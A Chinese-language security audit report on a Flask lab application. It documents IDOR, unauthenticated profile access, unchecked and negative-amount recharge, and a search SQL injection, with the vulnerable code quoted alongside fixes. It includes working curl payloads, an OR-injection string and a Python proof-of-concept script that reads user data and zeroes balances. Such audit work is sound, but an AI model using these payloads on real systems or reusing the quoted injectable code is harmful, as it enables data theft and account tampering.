## 1. 报告概述

本报告对"用户信息管理平台"进行安全审计，重点分析系统中存在的越权漏洞（Authorization Bypass / Privilege Escalation）。该项目基于 Python Flask 框架开发，包含用户登录、注册、搜索、头像上传、个人中心、充值等模块。

**越权漏洞**是指攻击者通过修改 URL 参数、表单字段等方式，绕过权限校验，访问或操作本应受限的资源。本项目中所有涉及用户数据读写的接口均缺少有效的权限校验机制。

### 测试环境

| 项目 | 说明 |
|------|------|
| 服务器地址 | http://192.168.234.129:5000 |
| 框架版本 | Flask 3.1.3 + SQLite 3 |
| 默认账号 | admin / admin123 · alice / alice2025 |
| 测试日期 | 2026-07-22 |
| 测试方法 | 黑盒 + 白盒审计 |

## 2. 漏洞 1：IDOR 越权访问（个人中心）

### 2.1 漏洞描述

**IDOR（Insecure Direct Object Reference，不安全的直接对象引用）** 是越权漏洞中最常见的一种。系统在个人中心模块中，直接使用 URL 参数 `user_id` 查询用户数据，但没有校验当前登录用户是否有权访问目标用户的资料。攻击者只需要修改 URL 中的 `user_id` 参数值，即可查看任意用户的邮箱、手机号、余额等敏感信息。

### 2.2 漏洞位置

| 属性 | 值 |
|------|-----|
| 文件 | `app.py` |
| 路由 | `/profile` |
| 方法 | GET |
| 行号 | ~393-415 |

**关键代码：**

```python
@app.route("/profile")
def profile():
    user_id = request.args.get("user_id")
    # ❌ 没有判断当前登录用户是谁
    # ❌ 没有校验 user_id 是否属于当前用户
    conn = sqlite3.connect("data/users.db")
    cursor = conn.execute(
        "SELECT id, username, email, phone, balance FROM users WHERE id = ?",
        (user_id,)
    )
    row = cursor.fetchone()
    return render_template("profile.html", user=user_info)
```

### 2.3 POC 复现

**操作步骤：**

1. 以普通用户 alice（user_id=2）身份登录系统
2. 修改 URL 参数为 `?user_id=1`
3. 浏览器访问 `http://192.168.234.129:5000/profile?user_id=1`
4. 成功查看到管理员 admin 的完整资料，包括余额 99999 元

**curl 命令验证：**

```bash
# 查看 admin 资料（user_id=1）
curl "http://192.168.234.129:5000/profile?user_id=1"
# 输出包含 admin 的邮箱、手机、余额等信息

# 查看 alice 资料（user_id=2）
curl "http://192.168.234.129:5000/profile?user_id=2"
# 输出包含 alice 的邮箱、手机、余额等信息
```

### 2.4 危害评级

| 维度 | 评分 |
|------|------|
| CVSS 评分 | 7.5 (HIGH) |
| 攻击路径 | 网络远程 |
| 攻击复杂度 | 低 — 仅需修改 URL 参数 |
| 危害 | 任意用户敏感信息泄露（手机、邮箱、余额） |

## 3. 漏洞 2：水平越权充值

### 3.1 漏洞描述

充值接口 `/recharge` 从表单接收 `user_id` 和 `amount` 参数，直接更新对应用户的余额。系统**未校验**当前登录用户与 `user_id` 是否匹配，导致攻击者可以给任意用户充值（或扣款）。同时，`amount` 参数未做正负校验，可填写负值实现"盗刷"余额的效果。

### 3.2 漏洞位置

| 属性 | 值 |
|------|-----|
| 文件 | `app.py` |
| 路由 | `/recharge` |
| 方法 | POST |
| 行号 | ~413-429 |

**关键代码：**

```python
@app.route("/recharge", methods=["POST"])
@csrf_required
def recharge():
    user_id = request.form.get("user_id")
    amount = request.form.get("amount")
    # ❌ 没有校验 user_id 是否属于当前登录用户
    # ❌ 没有校验 amount 是否为正值
    conn.execute(f"UPDATE users SET balance = balance + {amount} WHERE id = {user_id}")
```

### 3.3 POC 复现

#### 场景 A：用户 A 给用户 B 充值

1. 以普通用户 alice 身份登录，获取 CSRF Token
2. 构造 POST 请求，`user_id=1`（admin），`amount=1000`
3. admin 的余额被 alice 增加了 1000 元

#### 场景 B：负金额充值（盗刷余额）

1. 以 alice 身份登录，获取 CSRF Token
2. 构造 POST 请求，`user_id=1`（admin），`amount=-99999`
3. admin 的余额被扣减 99999 元，接近归零

**curl 命令验证：**

```bash
# 获取 CSRF Token
CSRF=$(curl -s -c /tmp/cookies.txt http://127.0.0.1:5000/login \
  | grep -oP 'value="\K[a-f0-9]+(?=")')

# 登录
curl -X POST http://127.0.0.1:5000/login -b /tmp/cookies.txt \
  -d "csrf_token=$CSRF&username=alice&password=alice2025"

# 给 admin 充值 1000 元（越权）
curl -X POST http://127.0.0.1:5000/recharge -b /tmp/cookies.txt \
  -d "csrf_token=xxx&user_id=1&amount=1000"

# 扣减 admin 余额（负金额）
curl -X POST http://127.0.0.1:5000/recharge -b /tmp/cookies.txt \
  -d "csrf_token=xxx&user_id=1&amount=-99999"
```

## 4. 漏洞 3：垂直越权 — 未登录访问

### 4.1 漏洞描述

`/profile` 路由没有任何登录校验（缺少 `@login_required` 或 session 检查），即使**未登录的用户**也可以直接通过 URL 访问任意用户的个人信息。系统仅在极少数路由（如 `/upload`）检查了 `"username" in session`，但最敏感的个人中心路由完全没有任何访问控制。

### 4.2 漏洞位置

| 属性 | 值 |
|------|-----|
| 文件 | `app.py` |
| 路由 | `/profile` |
| 行号 | ~393-394 |

**问题代码：**

```python
@app.route("/profile")
def profile():
    user_id = request.args.get("user_id")
    # ❌ 缺少: if "username" not in session: return redirect("/login")
```

### 4.3 POC 复现

1. 清除所有 Cookies（未登录状态）
2. 直接访问 `http://192.168.234.129:5000/profile?user_id=1`
3. 成功查看到 admin 的敏感信息
4. 修改 `user_id=2`，同样可查看 alice 的信息

```bash
# 无需 Cookie，直接访问
curl "http://192.168.234.129:5000/profile?user_id=1"
# 返回 admin 的 ID、用户名、邮箱、手机、余额
```

> ⚠️ **这是最危险的漏洞组合：既没有登录校验，也没有权限校验。**

## 5. 漏洞 4：业务逻辑漏洞 — 负金额充值

### 5.1 漏洞描述

充值接口对 `amount` 参数**未做任何正负校验**。攻击者可通过填写负数金额，将其他用户的余额转入自己账户，或直接清零目标用户的资产。这是一个典型的业务逻辑漏洞（Business Logic Vulnerability）。

### 5.2 漏洞位置

| 属性 | 值 |
|------|-----|
| 文件 | `app.py` |
| 路由 | `/recharge` |
| 参数 | `amount` 无校验 |
| 行号 | ~425 |

**问题代码：**

```python
# ❌ 未校验 amount 的正负
conn.execute(f"UPDATE users SET balance = balance + {amount} WHERE id = {user_id}")

# 正确做法：
# if float(amount) <= 0: return "金额必须大于零", 400
```

### 5.3 POC 复现

**攻击流程：将 admin 余额清零**

```bash
# 获取用户管理员余额（user_id=1）
curl "http://192.168.234.129:5000/profile?user_id=1"
# 余额: 99999

# 以 alice 身份登录后，扣减 admin 余额 99999
curl -X POST http://192.168.234.129:5000/recharge \
  -d "csrf_token=xxx&user_id=1&amount=-99999"

# 再次查看 admin 余额
curl "http://192.168.234.129:5000/profile?user_id=1"
# 余额: 0（已被清零）
```

## 6. 漏洞 5：信息泄露 — 搜索结果暴露用户数据

### 6.1 漏洞描述

搜索功能 `/search` 对外暴露了完整用户列表，包括 ID、用户名、邮箱、手机号。搜索结果直接以表格形式展示在页面上，且 ID 被做成可点击链接跳转到个人中心。攻击者可以通过 OR 注入等手段获取全部用户信息。

### 6.2 漏洞位置

| 属性 | 值 |
|------|-----|
| 文件 | `app.py` + `templates/index.html` |
| 路由 | `/search` |
| 行号 | app.py:~326 / index.html:~56-64 |

**关键代码：**

```python
# app.py - SQL 注入 + 信息泄露
query = f"SELECT id, username, email, phone FROM users WHERE ..."
```

```html
<!-- index.html - ID 可点击跳转个人中心 -->
<a href="/profile?user_id={{ row.id }}">{{ row.id }}</a>
<a href="/profile?user_id={{ row.id }}">{{ row.username }}</a>
```

### 6.3 POC 复现

```bash
# OR 注入获取全部用户信息
curl "http://192.168.234.129:5000/search?keyword=%27%20OR%20%271%27%3D%271"
# 返回所有注册用户的 ID、用户名、邮箱、手机号
```

## 7. 漏洞汇总

| # | 漏洞名称 | 严重程度 | 影响范围 | 攻击难度 |
|---|---------|---------|---------|---------|
| 1 | IDOR 越权访问个人中心 | 🔴 严重 | 全部用户信息 | 极低 |
| 2 | 水平越权充值 | 🔴 严重 | 全部用户余额 | 低 |
| 3 | 未登录垂直越权 | 🟠 高危 | 全部用户信息 | 极低 |
| 4 | 负金额业务逻辑漏洞 | 🟠 高危 | 全部用户余额 | 低 |
| 5 | 搜索结果信息泄露 | 🟡 中危 | 注册用户列表 | 低 |

### 攻击链分析

以上 5 个漏洞可以组合使用形成完整的攻击链：

- ① 利用未登录越权 → 获取全部用户 ID 和余额信息
- ② 利用 IDOR 查看目标用户详情 → 获取邮箱、手机
- ③ 利用水平越权充值 → 给自己账户加钱
- ④ 利用负金额漏洞 → 清零其他用户余额
- ⑤ 利用搜索 OR 注入 → 批量采集全量用户数据

## 8. 修复建议

### 修复 1：添加登录校验装饰器

所有需要登录才能访问的路由都应统一校验 session 中的登录状态：

```python
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "username" not in session:
            return redirect("/login")
        return f(*args, **kwargs)
    return decorated
```

然后应用到 `/profile`、`/recharge`、`/upload` 等路由：

```python
@app.route("/profile")
@login_required
def profile():
    ...
```

### 修复 2：添加资源所有权校验

个人中心和充值接口应校验当前用户与操作目标是否匹配：

```python
# 方法一：从 session 获取 user_id，不从 URL/表单获取
user_id = session.get("user_id")  # ✅ 安全

# 方法二：如果必须传参，则校验所有权
target_id = request.args.get("user_id")
if str(session.get("user_id")) != target_id:
    abort(403, "无权访问该用户资料")
```

### 修复 3：金额正负校验

充值接口应对 amount 做严格校验：

```python
try:
    amount = float(amount)
    if amount <= 0:
        return render_template(
            "profile.html", error="充值金额必须大于零", ...)
except (ValueError, TypeError):
    return render_template(
        "profile.html", error="金额格式不正确", ...)
```

### 修复 4：搜索结果脱敏

搜索接口返回用户数据时应进行脱敏处理：

```python
# 邮箱脱敏
masked_email = email[:3] + "***" + email[email.index("@"):]

# 手机号脱敏
masked_phone = phone[:3] + "****" + phone[-4:]
```

### 修复 5：统一权限管理框架

建议引入 Flask-Login 或 Flask-Principal 等成熟权限管理库，实现基于角色的访问控制（RBAC）：

```python
from flask_login import LoginManager, login_required

login_manager = LoginManager(app)

class User(UserMixin):
    def __init__(self, id, username, role):
        self.id = id
        self.username = username
        self.role = role

@app.route("/profile")
@login_required
def profile():
    # 自动获取当前登录用户信息
    current_user.id     # 当前用户的 ID
    current_user.role   # 当前用户的角色
```

## 9. POC 测试脚本

以下是一个完整的 Python POC 脚本，可用于验证所有越权漏洞：

```python
#!/usr/bin/env python3
"""
越权漏洞验证脚本
使用: python3 poc_auth_bypass.py
"""
import requests
import re

BASE_URL = "http://192.168.234.129:5000"


def extract_csrf(html):
    match = re.search(r'value="([a-f0-9]{32})"', html)
    return match.group(1) if match else ""


def test_idor_bypass():
    """测试 IDOR 越权访问其他用户资料"""
    print("[*] 测试 1: IDOR 越权访问")

    # 查看 admin 资料（无需登录）
    r = requests.get(f"{BASE_URL}/profile?user_id=1")
    if "admin" in r.text and "99999" in r.text:
        print("  [漏洞确认] 未登录可查看 admin 完整资料")

    # 查看 alice 资料
    r = requests.get(f"{BASE_URL}/profile?user_id=2")
    if "alice" in r.text and "100" in r.text:
        print("  [漏洞确认] 未登录可查看 alice 完整资料")

    # 查看不存在的用户
    r = requests.get(f"{BASE_URL}/profile?user_id=999")
    if "用户不存在" in r.text:
        print("  [正常] 不存在用户的提示正确")


def test_horizontal_privilege_escalation():
    """测试水平越权充值"""
    print("[*] 测试 2: 水平越权充值")

    session = requests.Session()

    # 登录 alice（user_id=2）
    r = session.get(f"{BASE_URL}/login")
    csrf = extract_csrf(r.text)
    session.post(f"{BASE_URL}/login", data={
        "csrf_token": csrf,
        "username": "alice",
        "password": "alice2025"
    })
    print("  已登录 alice")

    # 获取 CSRF Token
    r = session.get(f"{BASE_URL}/profile?user_id=1")
    csrf = extract_csrf(r.text)

    # alice 给 admin 充值 500（越权）
    r = session.post(f"{BASE_URL}/recharge", data={
        "csrf_token": csrf,
        "user_id": "1",
        "amount": "500"
    })
    if r.status_code == 302:
        print("  [漏洞确认] alice 成功给 admin 充值 500 元")


def test_negative_amount():
    """测试负金额充值"""
    print("[*] 测试 3: 负金额充值")

    session = requests.Session()

    # 登录 alice
    r = session.get(f"{BASE_URL}/login")
    csrf = extract_csrf(r.text)
    session.post(f"{BASE_URL}/login", data={
        "csrf_token": csrf,
        "username": "alice",
        "password": "alice2025"
    })

    r = session.get(f"{BASE_URL}/profile?user_id=1")
    csrf = extract_csrf(r.text)

    # 扣减 admin 余额
    r = session.post(f"{BASE_URL}/recharge", data={
        "csrf_token": csrf,
        "user_id": "1",
        "amount": "-50000"
    })
    if r.status_code == 302:
        print("  [漏洞确认] 负金额充值 -50000 成功，admin 余额被扣减")


if __name__ == "__main__":
    test_idor_bypass()
    test_horizontal_privilege_escalation()
    test_negative_amount()
    print("\n测试完成！")
```
